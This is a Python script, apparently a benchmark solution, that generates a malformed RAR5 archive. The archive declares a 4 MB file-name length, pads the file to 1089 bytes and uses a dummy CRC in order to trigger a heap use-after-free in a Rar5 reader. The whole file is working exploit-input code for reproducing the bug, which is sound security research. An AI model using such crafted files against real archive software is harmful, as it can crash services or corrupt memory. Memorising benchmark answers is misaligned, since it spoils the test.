import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Rar5 reader.
        The vulnerability involves reading a name size, allocating/reading the name, 
        and only then checking if the size is excessive.
        """
        def to_vint(n):
            if n == 0: return b'\x00'
            out = bytearray()
            while True:
                part = n & 0x7F
                n >>= 7
                if n > 0:
                    part |= 0x80
                    out.append(part)
                else:
                    out.append(part)
                    break
            return bytes(out)

        # RAR5 Signature
        RAR_SIGNATURE = b"\x52\x61\x72\x21\x1A\x07\x01\x00"

        # Construct Main Archive Header (Type 1)
        # Fields: Flags (VINT), ArchiveFlags (VINT)
        mh_flags = to_vint(0)
        mh_arc_flags = to_vint(0)
        mh_data = mh_flags + mh_arc_flags
        
        mh_type = to_vint(1)
        # Size field includes Type field and Data
        mh_len = len(mh_type) + len(mh_data)
        mh_size = to_vint(mh_len)
        
        # CRC is calculated over Size, Type, and Data
        mh_to_crc = mh_size + mh_type + mh_data
        mh_crc = zlib.crc32(mh_to_crc) & 0xFFFFFFFF
        mh_block = struct.pack("<I", mh_crc) + mh_to_crc

        # Construct File Header (Type 2)
        # We declare a large name length. 
        # In the vulnerable version, this triggers a large allocation and read loop 
        # before checking if the size is allowed.
        name_len_val = 1024 * 1024 * 4  # 4MB declared name size
        name_len_enc = to_vint(name_len_val)
        
        fh_fields = (
            to_vint(0) + # Flags
            to_vint(0) + # Extra Area Size
            to_vint(0) + # Data Size
            to_vint(0) + # File Attributes
            to_vint(0) + # Compression Info
            to_vint(0) + # Host OS
            name_len_enc # Name Length
        )
        
        fh_type = to_vint(2)
        
        # The Block Size must include the Name size to entice the parser to read it
        block_len = len(fh_type) + len(fh_fields) + name_len_val
        fh_size = to_vint(block_len)
        
        # Use a dummy CRC as we intend to truncate the file
        fh_crc = 0xDEADBEEF
        
        fh_prefix = struct.pack("<I", fh_crc) + fh_size + fh_type + fh_fields
        
        poc = RAR_SIGNATURE + mh_block + fh_prefix
        
        # Pad the PoC to the target length (1089 bytes)
        # This provides some data for the read, but far less than the declared 4MB.
        # This triggers the read loop, and subsequently the error path/cleanup 
        # which is associated with the UAF.
        target_len = 1089
        if len(poc) < target_len:
            poc += b'A' * (target_len - len(poc))
            
        return poc